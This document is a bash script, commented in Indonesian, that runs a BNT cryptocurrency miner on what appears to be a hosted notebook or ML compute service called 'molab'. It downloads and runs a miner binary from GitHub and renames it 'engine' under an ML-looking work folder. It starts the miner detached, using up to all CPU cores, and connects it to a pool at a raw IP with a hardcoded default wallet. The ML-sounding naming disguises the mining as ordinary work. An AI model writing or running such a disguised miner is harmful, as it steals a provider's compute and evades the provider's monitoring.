#!/usr/bin/env bash
# molab-bnt-miner — mining BNT di molab, address wallet lu sendiri
set -u

# ================= CONFIG =================
ACCT="${BNT_ADDRESS:-PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc}"
NODE="${BNT_NODE:-43.163.84.133:13333}"
PKG="https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz"
# ==========================================

BASE=/root/ml-work
ENGINE=$BASE/engine

is_elf() { [ -f "$1" ] && [ "$(head -c4 "$1" | od -An -tx1 | tr -d ' \n')" = "7f454c46" ]; }

case "${1:-start}" in
  list)
    echo "=== worker aktif ==="
    ps -eo pid,etime,args | grep -F "$BASE/" | grep -F engine | grep -v grep
    exit 0 ;;
  stop)
    pkill -f "$BASE/.*/engine" 2>/dev/null
    echo "semua worker dihentikan"
    exit 0 ;;
esac

mkdir -p "$BASE/logs" && cd "$BASE" || exit 1

if ! is_elf "$ENGINE"; then
  echo "[1/3] download runtime seine"
  curl -fL --max-time 300 -o p.tgz "$PKG" || { echo "fetch FAILED"; exit 1; }
  rm -rf x && mkdir x && tar xzf p.tgz -C x
  CAND=""
  for f in $(find x -type f); do
    if is_elf "$f"; then CAND="$f"; break; fi
  done
  [ -z "$CAND" ] && { echo "runtime not found"; exit 1; }
  mv -f "$CAND" engine && chmod +x engine && rm -rf x p.tgz
fi
echo "[2/3] runtime size=$(stat -c%s "$ENGINE")"

CORES=$(nproc)
MEM=$(awk '/MemTotal/{printf "%d",$2/1048576}' /proc/meminfo)
LANES="${2:-$CORES}"
CAP=$(( MEM / 2 ))
[ "$LANES" -gt "$CAP" ] && LANES=$CAP
[ "$LANES" -gt "$CORES" ] && LANES=$CORES
[ "$LANES" -lt 1 ] && LANES=1

WN="W-$(tr -dc '0-9' </dev/urandom | head -c6)"
LOG="$BASE/logs/$WN.log"

echo "[3/3] start worker $WN (lanes=$LANES, pool=$NODE)"
setsid nohup "$ENGINE" --mode pool --address "$ACCT" \
  --pool-url "stratum+tcp://$NODE" --worker "$WN" \
  --threads "$LANES" --cpu-page-mode auto --allow-oversubscribe \
  --stats-secs 30 >> "$LOG" 2>&1 &

sleep 10
echo "log: $LOG"
tail -n 5 "$LOG"
echo "hint: bash ml-run.sh list | bash ml-run.sh stop"
